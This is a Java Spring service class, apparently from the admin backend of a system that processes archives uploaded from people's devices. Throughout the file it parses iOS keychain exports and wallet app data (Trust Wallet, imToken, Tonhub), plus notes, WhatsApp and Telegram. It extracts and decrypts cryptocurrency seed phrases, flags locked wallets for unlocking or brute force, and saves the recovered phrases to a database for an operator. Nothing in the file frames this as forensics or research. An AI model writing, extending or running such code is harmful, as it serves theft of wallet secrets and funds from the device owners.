package com.admin.service;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.Callable;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Service;

import com.admin.config.V26AdminProperties;
import com.admin.dao.MnemonicDao;
import com.admin.dao.UploadFileDao;
import com.admin.entity.DeviceEntity;
import com.admin.entity.MnemonicEntity;
import com.admin.entity.UploadFileEntity;
import com.admin.parse.ArchiveIO;
import com.admin.parse.ArchiveScanner;
import com.admin.parse.ImTokenWallet;
import com.admin.parse.KeychainParse;
import com.admin.parse.ParsedNote;
import com.admin.parse.TrustWallet;
import com.admin.parse.WalletDisplay;
import com.admin.parse.WalletInspect;
import com.admin.parse.WalletMatcher;
import com.admin.util.MnemonicAesUtil;
import com.admin.util.UploadPaths;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@Service
@RequiredArgsConstructor
public class DeviceWalletService {

    private final UploadFileDao uploadFileDao;
    private final MnemonicDao mnemonicDao;
    private final ArchiveScanner archiveScanner;
    private final V26AdminProperties props;
    private final MnemonicPersistService persistService;
    private final KeychainParse keychainParse;
    private final TrustWallet trustWallet;
    private final ImTokenWallet imTokenWallet;

    /** 同一设备的压缩包互不依赖，并行扫完再按原顺序合并。 */
    private final ExecutorService scanPool = Executors.newFixedThreadPool(4, r -> {
        Thread t = new Thread(r, "wallet-scan");
        t.setDaemon(true);
        return t;
    });
    private final ConcurrentHashMap<String, Object> scanLocks = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, CachedScan> scanCache = new ConcurrentHashMap<>();

    private static final class CachedScan {
        final String fingerprint;
        final List<WalletDisplay> displays;
        final long at;

        CachedScan(String fingerprint, List<WalletDisplay> displays) {
            this.fingerprint = fingerprint;
            this.displays = displays;
            this.at = System.nanoTime();
        }
    }

    public Map<String, Object> enrichDetail(DeviceEntity d, Map<String, Object> data) {
        List<WalletDisplay> displays = scan(d);
        List<MnemonicEntity> storedRows = mnemonicDao.selectList(
                new QueryWrapper<MnemonicEntity>().eq("deviceId", d.getDeviceId()));
        List<Map<String, Object>> wallets = new ArrayList<>();
        List<Map<String, Object>> notes = new ArrayList<>();
        List<String[]> persistItems = new ArrayList<>();
        for (WalletDisplay w : displays) {
            if ("notes".equals(w.getWalletKey())) {
                notes.add(noteBlock(w));
            } else {
                wallets.add(walletCard(w, storedRows));
            }
            if (w.getPhrase() != null && !w.getPhrase().isBlank() && w.isStatusOk()
                    && !"notes".equals(w.getWalletKey())) {
                persistItems.add(new String[] {w.getName(), w.getPhrase()});
            }
        }
        if (!persistItems.isEmpty()) {
            try {
                persistService.finalizeRecovered(d.getDeviceId(), d.getAppId(), persistItems, false);
            } catch (Exception e) {
                log.warn("persist parse phrases fail device={}: {}", d.getDeviceId(), e.toString());
            }
        }
        data.put("wallets", wallets);
        data.put("notesItems", notes);
        data.put("walletCount", wallets.size());
        data.put("notesArchiveCount", notes.size());
        data.put("hasKeychain", hasKeychain(d.getDeviceId()));
        return data;
    }

    public boolean hasKeychain(String deviceId) {
        return UploadPaths.findDeviceKeychain(props.getUploadDir(), deviceId) != null;
    }

    public List<WalletDisplay> scan(DeviceEntity d) {
        String did = d.getDeviceId();
        Object lock = scanLocks.computeIfAbsent(did, k -> new Object());
        synchronized (lock) {
            List<UploadFileEntity> files = uploadFileDao.selectList(
                    new QueryWrapper<UploadFileEntity>().eq("deviceId", did).orderByDesc("id"));
            String fp = fingerprint(did, files);
            CachedScan hit = scanCache.get(did);
            if (hit != null && fp.equals(hit.fingerprint)) {
                return new ArrayList<>(hit.displays);
            }
            List<WalletDisplay> out = scanUploads(did, files);
            remember(did, fp, out);
            return new ArrayList<>(out);
        }
    }

    /**
     * 上传记录、磁盘文件时间和 keychain 都没变时，重复打开详情不再重扫压缩包。
     * 入库助记词仍每次从数据库读取，解锁后的状态不受缓存影响。
     */
    private String fingerprint(String did, List<UploadFileEntity> files) {
        StringBuilder sb = new StringBuilder();
        for (UploadFileEntity u : files) {
            sb.append(u.getId()).append('|')
                    .append(u.getFileName()).append('|')
                    .append(u.getFileSize()).append('|')
                    .append(u.getStatus()).append('|')
                    .append(u.getSha256()).append('|')
                    .append(u.getUpdatedAt() == null ? 0 : u.getUpdatedAt().getTime())
                    .append('|');
            String fname = StringUtils.trimToEmpty(u.getFileName());
            if (WalletMatcher.isCoreExportName(fname) || WalletMatcher.isArchive(fname)) {
                appendStat(sb, resolve(u));
            }
            sb.append('\n');
        }
        sb.append("kc|");
        appendStat(sb, UploadPaths.findDeviceKeychain(props.getUploadDir(), did));
        return sb.toString();
    }

    private static void appendStat(StringBuilder sb, Path path) {
        if (path == null) {
            sb.append('-');
            return;
        }
        try {
            sb.append(Files.size(path)).append('@').append(Files.getLastModifiedTime(path).toMillis());
        } catch (Exception e) {
            sb.append('!');
        }
    }

    private void remember(String did, String fp, List<WalletDisplay> out) {
        scanCache.put(did, new CachedScan(fp, out));
        if (scanCache.size() <= 32) {
            return;
        }
        String oldest = null;
        long at = Long.MAX_VALUE;
        for (Map.Entry<String, CachedScan> e : scanCache.entrySet()) {
            if (e.getValue().at < at) {
                at = e.getValue().at;
                oldest = e.getKey();
            }
        }
        if (oldest != null && !oldest.equals(did)) {
            scanCache.remove(oldest);
        }
    }

    private List<WalletDisplay> scanUploads(String did, List<UploadFileEntity> files) {
        List<WalletDisplay> out = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        List<Callable<List<WalletDisplay>>> jobs = new ArrayList<>();
        for (UploadFileEntity u : files) {
            String fname = StringUtils.trimToEmpty(u.getFileName());
            if (fname.isEmpty() || seen.contains(fname)) {
                continue;
            }
            if (u.getFileSize() != null && u.getFileSize() <= 0) {
                continue;
            }
            boolean core = WalletMatcher.isCoreExportName(fname);
            boolean archive = WalletMatcher.isArchive(fname);
            if (!core && !archive) {
                continue;
            }
            Path path = resolve(u);
            if (core) {
                if (path == null) {
                    log.warn("scan skip core_export missing device={} file={} diskPath={}",
                            did, fname, u.getDiskPath());
                    continue;
                }
                seen.add(fname);
                String fileName = fname;
                Path archivePath = path;
                jobs.add(() -> scanPath(did, fileName, archivePath));
                continue;
            }
            // 对齐 Python V2 classify：generic 归档不进解析卡
            String[] matched = WalletMatcher.matchWallet(fname);
            if (matched == null) {
                continue;
            }
            seen.add(fname);
            if (path == null) {
                log.warn("scan file missing device={} file={} diskPath={}", did, fname, u.getDiskPath());
                String title = matched[0];
                String wkey = matched[1];
                String fileName = fname;
                jobs.add(() -> List.of(archiveScanner.missingFile(title, fileName, wkey)));
            } else {
                String fileName = fname;
                Path archivePath = path;
                jobs.add(() -> scanPath(did, fileName, archivePath));
            }
        }
        out.addAll(runJobs(jobs));
        if (out.isEmpty()) {
            List<Callable<List<WalletDisplay>>> diskJobs = new ArrayList<>();
            for (Path p : UploadPaths.listDeviceArchives(props.getUploadDir(), did)) {
                String fname = p.getFileName().toString();
                if (seen.contains(fname)) {
                    continue;
                }
                if (!WalletMatcher.isCoreExportName(fname) && WalletMatcher.matchWallet(fname) == null) {
                    continue;
                }
                seen.add(fname);
                diskJobs.add(() -> scanPath(did, fname, p));
            }
            out.addAll(runJobs(diskJobs));
        }
        mergeKeychain(did, out);
        return expandImToken(out);
    }

    private List<WalletDisplay> runJobs(List<Callable<List<WalletDisplay>>> jobs) {
        List<WalletDisplay> out = new ArrayList<>();
        if (jobs.isEmpty()) {
            return out;
        }
        if (jobs.size() == 1) {
            try {
                List<WalletDisplay> part = jobs.get(0).call();
                if (part != null) {
                    out.addAll(part);
                }
            } catch (Exception e) {
                log.warn("scan fail err={}", e.toString());
            }
            return out;
        }
        try {
            for (Future<List<WalletDisplay>> future : scanPool.invokeAll(jobs)) {
                try {
                    List<WalletDisplay> part = future.get();
                    if (part != null) {
                        out.addAll(part);
                    }
                } catch (Exception e) {
                    log.warn("scan fail err={}", e.toString());
                }
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            log.warn("scan interrupted");
        }
        return out;
    }

    public Path resolveUpload(String deviceId, String fileName) {
        if (fileName == null || fileName.isBlank()) {
            return null;
        }
        UploadFileEntity file = uploadFileDao.selectOne(new QueryWrapper<UploadFileEntity>()
                .eq("deviceId", deviceId)
                .eq("fileName", fileName.trim())
                .orderByDesc("id")
                .last("LIMIT 1"));
        if (file != null) {
            Path p = resolve(file);
            if (p != null) {
                return p;
            }
        }
        return resolveOnDisk(deviceId, fileName);
    }

    public byte[] readNotesMember(String deviceId, String fileName, String member) {
        Path path = resolveUpload(deviceId, fileName);
        if (path == null || member == null || member.isBlank()) {
            return null;
        }
        byte[][] found = new byte[1][];
        ArchiveIO.walk(path, null, (name, in, size) -> {
            if (found[0] != null) {
                ArchiveIO.skipFully(in, size);
                return;
            }
            if (member.equals(name) || name.endsWith("/" + member) || name.replace('\\', '/').endsWith(member)) {
                found[0] = ArchiveIO.readLimited(in, 8_000_000);
            } else {
                ArchiveIO.skipFully(in, size);
            }
        }, 8_000_000);
        return found[0];
    }

    private List<WalletDisplay> scanPath(String deviceId, String fileName, Path path) {
        try {
            if (WalletMatcher.isCoreExportName(fileName)) {
                return archiveScanner.scanCoreExport(deviceId, fileName, path);
            }
            return archiveScanner.scanFile(deviceId, fileName, path);
        } catch (Exception e) {
            log.warn("scan fail file={} err={}", fileName, e.toString());
            return List.of();
        }
    }

    private Path resolve(UploadFileEntity u) {
        Path fromDb = UploadPaths.resolveDiskPath(props.getUploadDir(), u.getDiskPath());
        if (fromDb != null) {
            return fromDb;
        }
        if (u.getDiskPath() != null && !u.getDiskPath().isBlank()) {
            Path abs = Paths.get(u.getDiskPath());
            if (Files.isRegularFile(abs)) {
                return abs;
            }
        }
        return resolveOnDisk(u.getDeviceId(), u.getFileName());
    }

    private Path resolveOnDisk(String deviceId, String fileName) {
        return UploadPaths.findDeviceFile(props.getUploadDir(), deviceId, fileName);
    }

    private List<WalletDisplay> expandImToken(List<WalletDisplay> items) {
        List<WalletDisplay> out = new ArrayList<>();
        for (WalletDisplay w : items) {
            if ("imtoken".equals(w.getWalletKey())) {
                out.addAll(imTokenWallet.expand(w));
            } else {
                out.add(w);
            }
        }
        return out;
    }

    private void mergeKeychain(String did, List<WalletDisplay> items) {
        Path kc = UploadPaths.findDeviceKeychain(props.getUploadDir(), did);
        Map<String, KeychainParse.WalletHit> hits = kc == null
                ? new LinkedHashMap<>()
                : keychainParse.extract(kc);
        if (hits == null) {
            hits = new LinkedHashMap<>();
        }
        for (WalletDisplay w : items) {
            if ("trust".equals(w.getWalletKey())) {
                recoverTrust(w, hits.get("trust"));
            }
        }
        for (WalletDisplay w : items) {
            if ("trust".equals(w.getWalletKey()) && StringUtils.isNotBlank(w.getPhrase())) {
                continue;
            }
            applyKeychainPhrases(w, hits.get(w.getWalletKey()));
        }
        Set<String> seenKeys = new LinkedHashSet<>();
        for (WalletDisplay w : items) {
            if (StringUtils.isNotBlank(w.getWalletKey())) {
                seenKeys.add(w.getWalletKey());
            }
        }
        for (Map.Entry<String, KeychainParse.WalletHit> e : hits.entrySet()) {
            if (seenKeys.contains(e.getKey()) || e.getValue().getPhrases() == null
                    || e.getValue().getPhrases().isEmpty()) {
                continue;
            }
            List<String> phrases = e.getValue().getPhrases();
            WalletDisplay d = new WalletDisplay();
            d.setName(WalletMatcher.walletTitle(e.getKey()));
            d.setSourceFile("keychain.xml");
            d.setWalletKey(e.getKey());
            d.setPhrase(String.join("\n", phrases));
            d.setStatusOk(true);
            d.setUnlockable(false);
            d.setBrute(false);
            d.setStatusLabel("已解析");
            String src = StringUtils.defaultIfBlank(e.getValue().getSource(), "Keychain");
            d.setMessage(phrases.size() == 1 ? src + "：" + phrases.get(0)
                    : src + "，共 " + phrases.size() + " 组助记词");
            items.add(d);
        }
        recoverTrustFromDiskIfMissing(did, items, hits);
    }

    private void recoverTrust(WalletDisplay w, KeychainParse.WalletHit hit) {
        Map<String, String> utc = hit == null ? null : hit.getUtcPasswords();
        if (utc == null || utc.isEmpty() || w == null || w.getArchivePath() == null) {
            return;
        }
        List<String> recovered = trustWallet.recover(w.getArchivePath(), w.getArchiveRoots(), utc);
        if (recovered != null && !recovered.isEmpty()) {
            w.setPhrase(String.join("\n", recovered));
            w.setStatusOk(true);
            w.setUnlockable(false);
            w.setBrute(false);
            w.setStatusLabel("已解析");
            String src = "Keychain UTC + Documents keystore";
            w.setMessage(recovered.size() == 1 ? src + "：" + recovered.get(0)
                    : src + "，共 " + recovered.size() + " 组助记词");
        }
    }

    private void recoverTrustFromDiskIfMissing(String did, List<WalletDisplay> items,
            Map<String, KeychainParse.WalletHit> hits) {
        KeychainParse.WalletHit hit = hits.get("trust");
        if (hit == null || hit.getUtcPasswords() == null || hit.getUtcPasswords().isEmpty()) {
            return;
        }
        for (WalletDisplay w : items) {
            if ("trust".equals(w.getWalletKey()) && StringUtils.isNotBlank(w.getPhrase())) {
                return;
            }
        }
        Path tar = null;
        for (Path p : UploadPaths.listDeviceArchives(props.getUploadDir(), did)) {
            if ("trust".equals(WalletMatcher.classifyV2(p.getFileName().toString()))) {
                tar = p;
                break;
            }
        }
        if (tar == null) {
            return;
        }
        WalletDisplay w = null;
        for (WalletDisplay item : items) {
            if ("trust".equals(item.getWalletKey())) {
                w = item;
                break;
            }
        }
        if (w == null) {
            w = new WalletDisplay();
            w.setName(WalletMatcher.walletTitle("trust"));
            w.setSourceFile(tar.getFileName().toString());
            w.setWalletKey("trust");
            items.add(w);
        }
        w.setArchivePath(tar);
        recoverTrust(w, hit);
    }

    private void applyKeychainPhrases(WalletDisplay w, KeychainParse.WalletHit hit) {
        if (hit == null || hit.getPhrases() == null || hit.getPhrases().isEmpty()) {
            return;
        }
        List<String> phrases = hit.getPhrases();
        w.setPhrase(String.join("\n", phrases));
        w.setStatusOk(true);
        w.setUnlockable(false);
        w.setBrute(false);
        w.setStatusLabel("已解析");
        String src = StringUtils.defaultIfBlank(hit.getSource(), "Keychain");
        w.setMessage(phrases.size() == 1 ? src + "：" + phrases.get(0)
                : src + "，共 " + phrases.size() + " 组助记词");
    }

    private Map<String, Object> walletCard(WalletDisplay w, List<MnemonicEntity> storedRows) {
        String stored = storedPhrase(storedRows, w);
        boolean ok = w.isStatusOk() || StringUtils.isNotBlank(stored);
        boolean unlockable = w.isUnlockable() || WalletInspect.maybePasswordLocked(w.getWalletKey());
        boolean brute = w.isBrute() || ("tonhub".equals(w.getWalletKey()) && unlockable);
        String statusLabel = StringUtils.defaultIfBlank(w.getStatusLabel(),
                ok ? "已解析" : (unlockable ? "待解锁" : "未解析"));
        if (ok) {
            statusLabel = "已解析";
            unlockable = false;
            brute = false;
        }
        String message = StringUtils.defaultString(w.getMessage());
        String phrase = StringUtils.defaultIfBlank(stored, w.getPhrase());
        if (StringUtils.isNotBlank(stored) && StringUtils.isBlank(w.getPhrase())) {
            message = "助记词已入库（此前解锁/解析）";
        } else if (StringUtils.isNotBlank(phrase) && message.contains(phrase)) {
            message = "已直接解析助记词";
        }
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("name", w.getName());
        m.put("source_file", w.getSourceFile());
        m.put("wallet_key", w.getWalletKey());
        m.put("message", message);
        m.put("status_ok", ok);
        m.put("status_label", statusLabel);
        m.put("unlockable", unlockable && !ok);
        m.put("brute", brute && !ok);
        m.put("phrase_masked", mask(phrase));
        m.put("account_name", w.getAccountName());
        m.put("password_hint", w.getPasswordHint());
        m.put("wallet_instance_id", w.getWalletInstanceId());
        return m;
    }

    private Map<String, Object> noteBlock(WalletDisplay w) {
        Map<String, Object> m = new LinkedHashMap<>();
        m.put("name", w.getName());
        m.put("source_file", w.getSourceFile());
        m.put("wallet_key", "notes");
        m.put("message", w.getMessage());
        m.put("status_ok", w.isStatusOk());
        m.put("status_label", w.isStatusOk() ? "已解析" : StringUtils.defaultIfBlank(w.getStatusLabel(), "未解析"));
        List<Map<String, Object>> notes = new ArrayList<>();
        int i = 0;
        if (w.getNotes() != null) {
            for (ParsedNote n : w.getNotes()) {
                Map<String, Object> item = new LinkedHashMap<>();
                item.put("note_index", i++);
                item.put("title", n.getTitle());
                item.put("folder", n.getFolder());
                item.put("account", n.getAccount());
                item.put("modified_label", n.getModifiedLabel());
                String body = n.getBody() == null ? "" : n.getBody();
                item.put("body_preview", body.length() > 120 ? body.substring(0, 120) + "…" : body);
                item.put("locked", n.isLocked());
                int photoCount = n.getPhotos() == null ? 0 : n.getPhotos().size();
                item.put("photo_count", photoCount);
                notes.add(item);
            }
        }
        m.put("notes", notes);
        return m;
    }

    private String storedPhrase(List<MnemonicEntity> rows, WalletDisplay w) {
        if (w.getPhrase() != null && !w.getPhrase().isBlank()) {
            return w.getPhrase();
        }
        return matchStoredDisplay(rows, w);
    }

    /**
     * 对齐 Python apply_stored_phrases_to_displays。
     * imToken 卡片名是「imToken · 账户」，入库 source 可能只是 imToken，两边都要能对上。
     */
    private String matchStoredDisplay(List<MnemonicEntity> rows, WalletDisplay w) {
        if (rows == null || rows.isEmpty() || w == null) {
            return null;
        }
        String wkey = StringUtils.trimToEmpty(w.getWalletKey()).toLowerCase(Locale.ROOT);
        String name = StringUtils.trimToEmpty(w.getName()).toLowerCase(Locale.ROOT);
        String account = StringUtils.trimToEmpty(w.getAccountName()).toLowerCase(Locale.ROOT);
        if ("generic".equals(wkey) || "notes".equals(wkey) || "whatsapp".equals(wkey) || "telegram".equals(wkey)) {
            return null;
        }
        if (wkey.isEmpty() && name.isEmpty()) {
            return null;
        }
        String aes = props.getMnemonicAesKey();
        for (MnemonicEntity row : rows) {
            String plain;
            try {
                plain = MnemonicAesUtil.decrypt(row.getResult(), aes);
            } catch (Exception e) {
                continue;
            }
            if (plain == null || plain.isBlank() || MnemonicAesUtil.looksEncrypted(plain)) {
                continue;
            }
            plain = plain.trim();
            String src = row.getSource() == null ? "" : row.getSource().trim().toLowerCase(Locale.ROOT);
            String[] parts = src.replace('，', ',').split(",");
            boolean hit = false;
            if (!name.isEmpty()) {
                for (String p : parts) {
                    String part = p.trim();
                    if (part.isEmpty()) {
                        continue;
                    }
                    if (name.equals(part) || name.contains(part) || part.contains(name)
                            || name.equals(part.replace(" ", ""))) {
                        hit = true;
                        break;
                    }
                }
            }
            if (!hit && !account.isEmpty()) {
                for (String p : parts) {
                    String part = p.trim();
                    if (!part.isEmpty() && (account.equals(part) || part.contains(account))) {
                        hit = true;
                        break;
                    }
                }
            }
            if (!hit && !wkey.isEmpty() && account.isEmpty()) {
                for (String p : parts) {
                    if (wkey.equals(p.trim())) {
                        hit = true;
                        break;
                    }
                }
            }
            if (hit) {
                return plain;
            }
        }
        return null;
    }

    /**
     * 从 mnemonic 表按 wallet_key / 钱包显示名匹配已入库助记词（对齐 Python reveal 兜底）。
     */
    public String loadStoredPhrase(String deviceId, String walletKey, String title) {
        List<MnemonicEntity> rows = mnemonicDao.selectList(new QueryWrapper<MnemonicEntity>().eq("deviceId", deviceId));
        return matchStored(rows, walletKey, title);
    }

    private String matchStored(List<MnemonicEntity> rows, String walletKey, String title) {
        if (rows == null || rows.isEmpty()) {
            return null;
        }
        String aes = props.getMnemonicAesKey();
        String keyLow = walletKey == null ? "" : walletKey.trim().toLowerCase(Locale.ROOT);
        String titleLow = title == null ? "" : title.trim().toLowerCase(Locale.ROOT);
        List<String> matched = new ArrayList<>();
        for (MnemonicEntity row : rows) {
            String plain;
            try {
                plain = MnemonicAesUtil.decrypt(row.getResult(), aes);
            } catch (Exception e) {
                continue;
            }
            if (plain == null || plain.isBlank() || MnemonicAesUtil.looksEncrypted(plain)) {
                continue;
            }
            plain = plain.trim();
            String src = row.getSource() == null ? "" : row.getSource().trim().toLowerCase(Locale.ROOT);
            if ((!keyLow.isEmpty() && (src.contains(keyLow) || src.equals(keyLow)))
                    || (!titleLow.isEmpty() && (src.contains(titleLow) || src.equals(titleLow)))) {
                matched.add(plain);
            }
        }
        if (matched.isEmpty()) {
            return null;
        }
        return String.join("\n", matched);
    }

    /** 每行助记词保留前面的词，最后 4 个词用 **** 代替。对齐 Python {@code mask_mnemonic_phrase}。 */
    private static String mask(String phrase) {
        if (phrase == null || phrase.isBlank()) {
            return "";
        }
        List<String> lines = new ArrayList<>();
        for (String raw : phrase.split("\\r?\\n")) {
            String line = raw.trim();
            if (line.isEmpty()) {
                continue;
            }
            String[] words = line.split("\\s+");
            if (words.length <= 4) {
                lines.add("**** ".repeat(words.length).trim());
                continue;
            }
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < words.length; i++) {
                if (i > 0) {
                    sb.append(' ');
                }
                sb.append(i < words.length - 4 ? words[i] : "****");
            }
            lines.add(sb.toString());
        }
        return String.join("\n", lines);
    }

    public static String sha256Hex(String text) {
        try {
            byte[] d = MessageDigest.getInstance("SHA-256").digest(text.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            for (byte b : d) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }
}
